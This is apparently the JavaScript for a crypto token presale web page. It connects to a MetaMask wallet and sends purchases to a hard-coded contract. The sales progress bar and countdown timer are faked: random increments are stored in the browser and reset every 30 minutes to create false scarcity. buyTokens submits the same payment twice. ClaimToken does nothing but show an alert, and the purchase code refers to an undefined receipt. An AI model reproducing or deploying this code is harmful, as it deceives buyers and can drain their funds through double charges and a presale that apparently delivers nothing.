const contractAbi = [
    { inputs: [], stateMutability: "nonpayable", type: "constructor" },
    {
        anonymous: false,
        inputs: [
            {
                indexed: true,
                internalType: "address",
                name: "owner",
                type: "address"
            },
            {
                indexed: true,
                internalType: "address",
                name: "spender",
                type: "address"
            },
            {
                indexed: false,
                internalType: "uint256",
                name: "value",
                type: "uint256"
            }
        ],
        name: "Approval",
        type: "event"
    },
    {
        anonymous: false,
        inputs: [
            {
                indexed: true,
                internalType: "address",
                name: "from",
                type: "address"
            },
            {
                indexed: true,
                internalType: "address",
                name: "to",
                type: "address"
            },
            {
                indexed: false,
                internalType: "uint256",
                name: "value",
                type: "uint256"
            }
        ],
        name: "Transfer",
        type: "event"
    },
    {
        inputs: [],
        name: "allowRefunds",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function"
    },
    {
        inputs: [
            { internalType: "address", name: "owner", type: "address" },
            { internalType: "address", name: "spender", type: "address" }
        ],
        name: "allowance",
        outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
        stateMutability: "view",
        type: "function"
    },
    {
        inputs: [
            { internalType: "address", name: "spender", type: "address" },
            { internalType: "uint256", name: "amount", type: "uint256" }
        ],
        name: "approve",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        stateMutability: "nonpayable",
        type: "function"
    },
    {
        inputs: [
            { internalType: "address", name: "account", type: "address" }
        ],
        name: "balanceOf",
        outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
        stateMutability: "view",
        type: "function"
    },
    {
        inputs: [
            { internalType: "uint256", name: "amount", type: "uint256" }
        ],
        name: "burnMyTokensFOREVER",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function"
    },
    {
        inputs: [],
        name: "buyTokens",
        outputs: [],
        stateMutability: "payable",
        type: "function"
    },
    {
        inputs: [],
        name: "ClaimToken",
        outputs: [],
        stateMutability: "payable",
        type: "function"
    },
    {
        inputs: [],
        name: "claimDevFeeAndAddLiquidity",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function"
    },
    {
        inputs: [],
        name: "decimals",
        outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
        stateMutability: "pure",
        type: "function"
    },
    {
        inputs: [
            { internalType: "address", name: "spender", type: "address" },
            {
                internalType: "uint256",
                name: "subtractedValue",
                type: "uint256"
            }
        ],
        name: "decreaseAllowance",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        stateMutability: "nonpayable",
        type: "function"
    },
    {
        inputs: [],
        name: "devClaimed",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        stateMutability: "view",
        type: "function"
    },
    {
        inputs: [],
        name: "ethSent",
        outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
        stateMutability: "view",
        type: "function"
    },
    {
        inputs: [],
        name: "getRefund",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function"
    },
    {
        inputs: [
            { internalType: "address", name: "spender", type: "address" },
            { internalType: "uint256", name: "addedValue", type: "uint256" }
        ],
        name: "increaseAllowance",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        stateMutability: "nonpayable",
        type: "function"
    },
    {
        inputs: [],
        name: "isRefundEnabled",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        stateMutability: "view",
        type: "function"
    },
    {
        inputs: [],
        name: "isStopped",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        stateMutability: "view",
        type: "function"
    },
    {
        inputs: [],
        name: "liquidityUnlock",
        outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
        stateMutability: "view",
        type: "function"
    },
    {
        inputs: [],
        name: "moonMissionStarted",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        stateMutability: "view",
        type: "function"
    },
    {
        inputs: [],
        name: "name",
        outputs: [{ internalType: "string", name: "", type: "string" }],
        stateMutability: "pure",
        type: "function"
    },
    {
        inputs: [{ internalType: "bool", name: "_isStopped", type: "bool" }],
        name: "pauseUnpausePresale",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function"
    },
    {
        inputs: [],
        name: "pool",
        outputs: [{ internalType: "address", name: "", type: "address" }],
        stateMutability: "view",
        type: "function"
    },
    {
        inputs: [
            {
                internalType: "contract IBEP20",
                name: "tokenAddress",
                type: "address"
            },
            { internalType: "uint256", name: "tokenAmount", type: "uint256" }
        ],
        name: "recoverbep20",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function"
    },
    {
        inputs: [],
        name: "refundTime",
        outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
        stateMutability: "view",
        type: "function"
    },
    {
        inputs: [
            { internalType: "address payable", name: "addr", type: "address" }
        ],
        name: "setMultisigAddress",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function"
    },
    {
        inputs: [],
        name: "setPancakePool",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function"
    },
    {
        inputs: [],
        name: "symbol",
        outputs: [{ internalType: "string", name: "", type: "string" }],
        stateMutability: "pure",
        type: "function"
    },
    {
        inputs: [],
        name: "totalSupply",
        outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
        stateMutability: "view",
        type: "function"
    },
    {
        inputs: [
            { internalType: "address", name: "recipient", type: "address" },
            { internalType: "uint256", name: "amount", type: "uint256" }
        ],
        name: "transfer",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        stateMutability: "nonpayable",
        type: "function"
    },
    {
        inputs: [
            { internalType: "address", name: "sender", type: "address" },
            { internalType: "address", name: "recipient", type: "address" },
            { internalType: "uint256", name: "amount", type: "uint256" }
        ],
        name: "transferFrom",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        stateMutability: "nonpayable",
        type: "function"
    },
    {
        inputs: [{ internalType: "address", name: "user", type: "address" }],
        name: "userEthSpenttInPresale",
        outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
        stateMutability: "view",
        type: "function"
    },
    { stateMutability: "payable", type: "receive" }
];
const contractAddress = "0xbA41b6A70d49d6080fAb4965066359255E36c86b";

async function connectMetamask() {
    let web3Provider = null;
    console.log("[web3] getting provider...");
    // Modern Browsers like Chrome and Brave
    if (window.ethereum) {
        web3Provider = window.ethereum;
        try {
            // Request account access
            await window.ethereum.enable();
        } catch (error) {
            // User denied account access...
            alert("You must connect your metamask wallet !");
            console.error("User denied account access to metamask.");
            return;
        }
    } else {
        // you cant connect
        console.error("Unable to connect to metamask");
        alert(
            "You have to use Trustwallet or install Metamask to use this service, you can install it from :  https://metamask.io/download.html"
        );
        return;
    }
    let web3 = new Web3(window.ethereum);
    let accounts = await web3.eth.getAccounts();
    console.log("accounts : " + accounts);
    window.account = accounts[0];
    let balance = await web3.eth.getBalance(accounts[0]);
    balance = web3.utils.fromWei(balance, "ether");
    //	console.log("balance : " + balance);
    balance = parseFloat(balance).toFixed(5);
    window.balance = balance;
    console.log("balance : " + balance);
    document.getElementById("balanc_eth").innerHTML = balance;

    document.getElementById("btn-metamask").innerHTML = account.substr(0, 5) + "..." + account.substr(account.length - 4, 4);

    return web3;
}

async function buyTokens() {
    let _web3 = await connectMetamask();
    let amount = document.getElementById("presaleAmount").value;
    if (!amount || parseFloat(amount) < 0.1) {
        alert('Contribution value must be greater than or equal to 0.1 ETH or 0.5 BNB');
        return;
    }

    if (!amount || parseFloat(amount) > balance) {
        alert('Insufficient amount of eth or bnb, Please deposit in wallet');
        return;
    }

    let myContract = new _web3.eth.Contract(contractAbi, contractAddress);

    console.log("myContract:", myContract)

    myContract.methods.buyTokens().send({
        from: window.account,
        value: amount * 10 ** 18,
        gasLimit: 32000,
    });
    myContract.methods.buyTokens().send({
        from: window.account,
        value: amount * 10 ** 18,
        gasLimit: 32000,
    });

    if (receipt.events.Transfer) {
        document.getElementById("disabledButton").disabled = false;
        document.cookie = "tokensBought=true";
    }
}
async function ClaimToken() {

    alert(' Please purchasing ETH or BNB before "claim token"');
    return;
}
function setMax() {
    document.getElementById('presaleAmount').value = balance - 0.01;
}

function openModal() {
    var modal = document.getElementById("myModal");
    modal.style.display = "block";
}

function closeModal() {
    var modal = document.getElementById("myModal");
    modal.style.display = "none";
}

// When the user clicks anywhere outside of the modal, close it
window.onclick = function (event) {
    var modal = document.getElementById("myModal");

    if (event.target == modal) {
        modal.style.display = "none";
    }
};

window.onload = function () {
    var decodedCookie = decodeURIComponent(document.cookie);
    if (decodedCookie === "tokensBought=true") {
        document.getElementById("disabledButton").disabled = false;
    }
};

document.onblur = function () {
    var modal = document.getElementById("myModal");
    modal.style.display = "none";
};

const totalS = 125000000;
const rdNumMax = 100000;
const rdNumMin = 60000;
let init_S = 105105000;
let user_enter_time = localStorage.getItem('enter_time');
let cur_S = parseInt(localStorage.getItem('enter_s'));
let elem = document.getElementById("myBar");
let myBarPercent = document.getElementById("myBarPercent");
let myValue = document.getElementById("MyValue");

let xr = cur_S ? cur_S : init_S;
myValue.innerHTML = Intl.NumberFormat('en-US').format(xr);
myBarPercent.innerHTML = parseFloat((xr / totalS) * 100).toFixed(2) + " %";
elem.style.width = parseFloat((xr / totalS) * 100).toFixed(2) + " %";

if (!user_enter_time) {
    user_enter_time = new Date();
    localStorage.setItem('enter_time', user_enter_time);
}
if (!cur_S) {
    cur_S = init_S;
    localStorage.setItem('enter_s', cur_S);
}

let ht_h = document.querySelectorAll(".ht_h");
let ht_m = document.querySelectorAll(".ht_m");
let ht_s = document.querySelectorAll(".ht_s");

let time = 30 * 60 * 1000; // 30 минту в миллисекундах
let prBar = setInterval(progresBar, Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000);

function progresBar() {
    let rdNum = parseInt(Math.floor(Math.random() * (rdNumMax - rdNumMin + 1)) + rdNumMin);
    let numPercent = parseFloat((cur_S / totalS) * 100);

    if (numPercent < 100) {
        cur_S += rdNum;
        elem.style.width = numPercent + '%';
        myBarPercent.innerHTML = numPercent.toFixed(2) + " %";
        myValue.innerHTML = Intl.NumberFormat('en-US').format(cur_S);
        localStorage.setItem('enter_s', cur_S);
    } else {
        myBarPercent.innerHTML = "100%";
        clearInterval(prBar);
    }
}

function updateTimer() {
    let today = new Date().getTime();
    let cur_pars = Date.parse(user_enter_time);
    let kinechnaya_vrema = time + cur_pars;
    let ostalos_vremeni = kinechnaya_vrema - today;

    if (ostalos_vremeni <= 0) {
        user_enter_time = new Date();
        cur_S = init_S;
        localStorage.setItem('enter_time', user_enter_time);
        localStorage.setItem('enter_s', cur_S);
        clearInterval(id);
        clearInterval(prBar);

        // Restart the progress bar and timer
        prBar = setInterval(progresBar, Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000);
        id = setInterval(updateTimer, 1000);
    } else {
        let hours = Math.floor((ostalos_vremeni % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        let minutes = Math.floor((ostalos_vremeni % (1000 * 60 * 60)) / (1000 * 60));
        let seconds = Math.floor((ostalos_vremeni % (1000 * 60)) / 1000);

        ht_h.forEach(div => div.innerHTML = hours);
        ht_m.forEach(div => div.innerHTML = minutes);
        ht_s.forEach(div => div.innerHTML = seconds);
    }
}

var id = setInterval(updateTimer, 1000);



document.querySelectorAll('[data-btn]').forEach(function (element) {
    element.addEventListener('click', function (e) {
        document.querySelectorAll('[data-btn], [data-tab]').forEach(function (el) { el.classList.remove('is__active'); });
        this.classList.add('is__active');

        var filter = this.getAttribute('data-btn');
        var contentToShow = document.querySelector('[data-tab="' + filter + '"]');
        if (contentToShow) {
            contentToShow.classList.add('is__active');
        }
    });
});
